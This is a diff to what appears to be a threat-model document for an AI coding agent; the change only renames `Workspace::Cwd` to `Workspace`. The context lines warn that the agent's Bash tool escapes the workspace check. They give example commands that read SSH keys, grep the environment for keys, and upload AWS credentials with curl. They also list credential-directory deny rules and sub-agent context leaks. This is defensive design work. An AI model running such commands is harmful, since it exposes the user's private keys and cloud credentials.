@@ -126,7 +126,7 @@ hatches if true nesting is unavoidable.
 
 ### Bash escapes the workspace seam
 
-`Workspace::Cwd` constrains `Read` / `Write` / `Edit` / `Grep` /
+`Workspace` constrains `Read` / `Write` / `Edit` / `Grep` /
 `Glob`. **It does not constrain `Bash`.** `cat ~/.ssh/id_rsa`,
 `env | grep -i key`, `curl --upload-file ~/.aws/credentials ...` all
 run as the user. The Confirmer is the only thing between yolo-off mode
@@ -221,7 +221,7 @@ cloned by the user. Same defense as the lethal-trifecta point.
 - **`URLCache` on disk.** Cached pages with embedded auth cookies or
   sensitive scrape results — disk encryption matters, backups matter.
 - **TOCTOU.** Mostly theoretical for an interactive agent, but
-  `Workspace::Cwd`'s check-then-open isn't atomic on POSIX.
+  `Workspace`'s check-then-open isn't atomic on POSIX.
 - **Sub-agent context leak.** A child given less context than the
   parent can still leak parent context that flows in via the parent's
   "task" prompt.
@@ -324,7 +324,7 @@ warnings.
 - **opencode's `(permission-name, glob-pattern)` ruleset shape** if
   `Confirmer` ever expands beyond binary approve/deny.
 - **PI's credential-dir deny-read defaults** (`~/.ssh`, `~/.aws`,
-  `~/.gnupg`) — a `Workspace::Cwd` default denylist gives some real
+  `~/.gnupg`) — a `Workspace` default denylist gives some real
   protection even without a sandbox, and it's a one-method change.
   Same for deny-write on `.env*` / `*.pem` / `*.key`.
 - **Gondolin's secret-placeholder pattern.** A tool surface where env
